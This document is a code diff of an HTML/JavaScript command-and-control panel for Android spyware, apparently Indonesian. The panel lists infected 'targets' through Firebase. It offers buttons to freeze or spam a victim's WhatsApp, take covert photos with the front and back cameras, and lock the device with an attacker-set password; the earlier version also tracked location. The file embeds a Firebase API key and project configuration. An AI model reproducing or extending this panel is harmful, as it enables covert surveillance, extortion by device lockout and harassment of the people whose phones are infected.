@@ -3,64 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OMNI-CONTROL V.FINAL</title>
+    <title>OMNI-CONTROL DEVELOPER</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
     <style>
-        body { background: #050505; color: #00f3ff; font-family: sans-serif; margin: 0; }
-        header { background: #111; padding: 20px; text-align: center; border-bottom: 2px solid #00f3ff; }
-        .container { display: grid; grid-template-columns: 250px 1fr; height: 90vh; }
-        .sidebar { border-right: 1px solid #333; padding: 15px; overflow-y: auto; }
+        :root { --primary: #a020f0; --bg-dark: #0d0d0d; --card-bg: #1a1a2e; --text-light: #e0e0e0; --wa-green: #25d366; }
+        body { background-color: var(--bg-dark); color: var(--text-light); font-family: 'Rajdhani', sans-serif; margin: 0; padding: 0; }
+        header { background: linear-gradient(90deg, #1a1a2e 0%, #a020f0 100%); padding: 20px; border-bottom: 2px solid var(--primary); box-shadow: 0 0 15px var(--primary); }
+        header h1 { font-family: 'Orbitron', sans-serif; margin: 0; font-size: 1.2rem; color: #fff; }
+        .container { display: grid; grid-template-columns: 280px 1fr; height: calc(100vh - 70px); }
+        .sidebar { background: #111; border-right: 1px solid #222; padding: 15px; overflow-y: auto; }
+        .target-item { background: rgba(160, 32, 240, 0.1); border: 1px solid var(--primary); border-radius: 10px; padding: 12px; margin-bottom: 10px; cursor: pointer; transition: 0.3s; }
+        .target-item:hover, .target-item.active { background: var(--primary); color: #fff; box-shadow: 0 0 10px var(--primary); }
         .main { padding: 20px; overflow-y: auto; }
-        .target-card { padding: 10px; border: 1px solid #00f3ff; margin-bottom: 10px; cursor: pointer; border-radius: 5px; }
-        .target-card:hover { background: rgba(0,243,255,0.2); }
-        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .box { background: #111; padding: 15px; border-radius: 10px; border: 1px solid #333; }
-        input, button { padding: 10px; width: 100%; box-sizing: border-box; margin-top: 10px; border-radius: 5px; border: none; }
-        button { background: #ff003c; color: white; cursor: pointer; font-weight: bold; }
-        .btn-unlock { background: #00ff00; color: #000; margin-top: 5px; }
+        .profile-card { background: var(--card-bg); border: 1px solid rgba(160, 32, 240, 0.3); border-radius: 15px; padding: 20px; margin-bottom: 20px; display: flex; align-items: center; gap: 15px; }
+        .profile-img { width: 60px; height: 60px; border-radius: 50%; background: var(--primary); border: 2px solid #fff; background-image: url('https://img.icons8.com/ios-filled/50/ffffff/user-shield.png'); background-size: 60%; background-position: center; background-repeat: no-repeat; }
+        .info-box { background: rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 15px; border-left: 4px solid var(--primary); margin-bottom: 15px; }
+        .label { font-size: 0.7rem; color: #888; text-transform: uppercase; }
+        .value { font-size: 1rem; font-weight: bold; }
+        .btn-group { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
+        button { background: transparent; border: 2px solid var(--primary); color: var(--primary); padding: 12px; border-radius: 10px; font-family: 'Orbitron', sans-serif; font-size: 0.7rem; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
+        button:hover { background: var(--primary); color: #fff; box-shadow: 0 0 15px var(--primary); }
+        .btn-red { border-color: #ff0055; color: #ff0055; }
+        .btn-red:hover { background: #ff0055; box-shadow: 0 0 15px #ff0055; }
+        .btn-wa { border-color: var(--wa-green); color: var(--wa-green); }
+        .btn-wa:hover { background: var(--wa-green); color: #000; box-shadow: 0 0 15px var(--wa-green); }
+        #target-photo { width: 100%; max-width: 400px; border-radius: 15px; border: 2px solid var(--primary); margin-top: 15px; display: none; }
+        input { width: 100%; background: #000; border: 1px solid #333; color: #fff; padding: 12px; border-radius: 10px; margin-top: 10px; box-sizing: border-box; }
     </style>
 </head>
 <body>
 
-<header><h1 style="font-family:'Orbitron'">OMNI-COMMANDER V.FINAL</h1></header>
+<header><h1>HAI, KING MASTER WARMZ</h1></header>
 
 <div class="container">
-    <div class="sidebar" id="target-list">
-        <h3>TARGET LIST</h3>
-        <div id="list-container">Menunggu data...</div>
+    <div class="sidebar" id="list-container">
+        <h3 style="color: var(--primary);">TARGET LIST</h3>
+        <div id="target-items">Menunggu...</div>
     </div>
+
     <div class="main">
-        <h2 id="active-id">PILIH TARGET</h2>
-        <div class="info-grid">
-            <div class="box">LOKASI: <p id="d-loc">-</p></div>
-            <div class="box">BATERAI: <p id="d-batt">-</p></div>
-            <div class="box">PERANGKAT: <p id="d-dev">-</p></div>
-            <div class="box">TERAKHIR: <p id="d-last">-</p></div>
+        <div class="profile-card">
+            <div class="profile-img"></div>
+            <div>
+                <h2 id="active-id" style="margin:0;">PILIH TARGET</h2>
+                <span style="color:var(--primary); font-size:0.9rem; font-weight:bold; letter-spacing: 2px;">DEVELOPER</span>
+            </div>
         </div>
-        <button onclick="window.open('https://www.google.com/maps?q='+document.getElementById('d-loc').innerText)">LACAK DI MAPS</button>
-        <hr style="border:1px solid #333; margin:20px 0;">
-        <div class="box" style="border-color: red;">
-            <h3>BRUTAL LOCK CONTROL</h3>
-            <input type="text" id="pass-val" placeholder="Set Password Lock...">
-            <button onclick="sendCmd('lock')">KIRIM BRUTAL LOCK</button>
-            <button class="btn-unlock" onclick="sendCmd('unlock')">OPEN LOCK / RELEASE</button>
+
+        <div class="info-box" style="border-left-color: var(--wa-green);">
+            <h3 style="margin:0; color: var(--wa-green);">WHATSAPP EXPLOIT</h3>
+            <div class="btn-group">
+                <button class="btn-wa" onclick="sendCmd('wa_bug')">FREEZE WA</button>
+                <button class="btn-wa" onclick="sendCmd('wa_spam')">SPAM CHAT</button>
+            </div>
+        </div>
+
+        <div class="info-box" style="border-left-color: #00f3ff;">
+            <h3 style="margin:0; color: #00f3ff;">STEALTH CAMERA</h3>
+            <div class="btn-group">
+                <button onclick="sendCmd('snap_front')">Snap Front</button>
+                <button onclick="sendCmd('snap_back')">Snap Back</button>
+            </div>
+            <img id="target-photo" src="">
+        </div>
+
+        <div class="info-box" style="border-left-color: #ff0055;">
+            <h3 style="margin:0; color: #ff0055;">REMOTE COMMAND</h3>
+            <input type="text" id="pass-val" placeholder="Set Brutal Password...">
+            <div class="btn-group">
+                <button class="btn-red" onclick="sendCmd('lock')">Lock Device</button>
+                <button style="border-color: #00ff00; color:#00ff00;" onclick="sendCmd('unlock')">Unlock</button>
+            </div>
         </div>
     </div>
 </div>
 
 <script>
     const firebaseConfig = {
-    apiKey: "AIzaSyAS9ZCVt6iFXY8Ksd0o5z7fjXg3qi8rfhU",
-    authDomain: "remote-control-9bf2c.firebaseapp.com",
-    databaseURL: "https://remote-control-9bf2c-default-rtdb.asia-southeast1.firebasedatabase.app",
-    projectId: "remote-control-9bf2c",
-    storageBucket: "remote-control-9bf2c.firebasestorage.app",
-    messagingSenderId: "71798344189",
-    appId: "1:71798344189:web:6cdb414c1eab16c6b9b194"
-};
-
+        apiKey: "AIzaSyAS9ZCVt6iFXY8Ksd0o5z7fjXg3qi8rfhU", authDomain: "https://remote-control-9bf2c.firebaseapp.com",
+        databaseURL: "https://remote-control-9bf2c-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId: "remote-control-9bf2c", storageBucket: "remote-control-9bf2c.firebasestorage.app",
+        messagingSenderId: "71798344189", appId: "1:71798344189:web:6cdb414c1eab16c6b9b194"
     };
 
     firebase.initializeApp(firebaseConfig);
@@ -68,12 +93,12 @@
     let currentId = "";
 
     db.ref('targets').on('value', (snap) => {
-        const container = document.getElementById('list-container');
+        const container = document.getElementById('target-items');
         container.innerHTML = "";
         snap.forEach((child) => {
             const div = document.createElement('div');
-            div.className = "target-card";
-            div.innerText = child.key;
+            div.className = `target-item ${child.key === currentId ? 'active' : ''}`;
+            div.innerHTML = `<strong>${child.key}</strong><br><small style="font-size:0.6rem;">${child.val().device || 'Android'}</small>`;
             div.onclick = () => selectTarget(child.key);
             container.appendChild(div);
         });
@@ -84,17 +109,14 @@
         document.getElementById('active-id').innerText = id;
         db.ref('targets/' + id).on('value', (snap) => {
             const data = snap.val();
-            document.getElementById('d-loc').innerText = data.lat + "," + data.lng;
-            document.getElementById('d-batt').innerText = data.battery + "%";
-            document.getElementById('d-dev').innerText = data.device;
-            document.getElementById('d-last').innerText = data.lastSeen;
+            if(data.photo) { document.getElementById('target-photo').src = data.photo; document.getElementById('target-photo').style.display = 'block'; }
         });
     }
 
     function sendCmd(act) {
         if(!currentId) return alert("Pilih target!");
         const p = document.getElementById('pass-val').value;
-        db.ref('targets/' + currentId + '/command').set({ action: act, password: p });
+        db.ref('targets/' + currentId + '/command').update({ action: act, password: p, t: Date.now() });
         alert("Command Sent!");
     }
 </script>
